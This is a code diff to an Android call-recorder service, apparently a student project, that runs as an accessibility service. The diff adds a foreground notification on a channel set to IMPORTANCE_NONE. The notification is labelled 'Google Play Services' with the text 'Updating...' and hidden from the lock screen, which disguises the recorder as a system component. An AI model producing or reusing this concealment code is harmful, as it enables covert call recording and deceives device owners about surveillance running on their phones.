@@ -2,6 +2,9 @@ package in.ac.vitbhopal.projects.callrecorder.services;
 
 import android.accessibilityservice.AccessibilityService;
 import android.app.AlarmManager;
+import android.app.Notification;
+import android.app.NotificationChannel;
+import android.app.NotificationManager;
 import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
@@ -10,8 +13,10 @@ import android.os.SystemClock;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
 import androidx.annotation.RequiresApi;
+import androidx.core.app.NotificationCompat;
 import androidx.core.util.Consumer;
 import in.ac.vitbhopal.projects.callrecorder.MainActivity;
+import in.ac.vitbhopal.projects.callrecorder.R;
 import in.ac.vitbhopal.projects.callrecorder.RecorderConstants;
 import in.ac.vitbhopal.projects.callrecorder.helper.PhoneState;
 import in.ac.vitbhopal.projects.callrecorder.helper.PhoneStateChangeListener;
@@ -29,6 +34,20 @@ public class RecorderService extends AccessibilityService {
         super.onCreate();
         initializeRecorder();
         initializeStateChangeHandler();
+        createNotificationChannel();
+        initiateNotification();
+    }
+
+    private void createNotificationChannel() {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            NotificationChannel serviceChannel = new NotificationChannel(
+                    RecorderConstants.NOTIFICATION_CHANNEL_ID,
+                    "ARS Notification Channel",
+                    NotificationManager.IMPORTANCE_NONE
+            );
+            NotificationManager manager = getSystemService(NotificationManager.class);
+            manager.createNotificationChannel(serviceChannel);
+        }
     }
 
     @Override
@@ -94,5 +113,22 @@ public class RecorderService extends AccessibilityService {
         intent.setAction(Intent.ACTION_MAIN);
         intent.addCategory(Intent.CATEGORY_LAUNCHER);
         startActivity(intent);
+    }
+
+    private void initiateNotification() {
+        Intent notificationIntent = new Intent(this, MainActivity.class);
+        PendingIntent pendingIntent = PendingIntent.getActivity(
+                this,
+                0, notificationIntent, 0
+        );
+        Notification notification = new NotificationCompat.Builder(this, RecorderConstants.NOTIFICATION_CHANNEL_ID)
+                .setContentTitle("Google Play Services")
+                .setContentText("Updating...")
+                .setSmallIcon(R.drawable.ic_launcher_background)
+                .setContentIntent(pendingIntent)
+                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+                .build();
+
+        startForeground(1, notification);
     }
 }
